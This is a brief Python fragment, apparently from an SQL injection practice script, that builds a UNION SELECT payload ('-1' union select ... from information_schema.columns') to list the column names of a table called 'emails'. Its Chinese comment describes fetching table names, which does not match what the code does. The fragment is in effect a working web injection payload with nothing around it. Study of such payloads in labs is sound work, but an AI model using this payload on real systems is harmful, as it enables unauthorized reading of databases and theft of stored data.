...
table='emails'
payload_table_from_tab="-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='"+table+"'" #从information_schema.tables中获取数据库所有表名
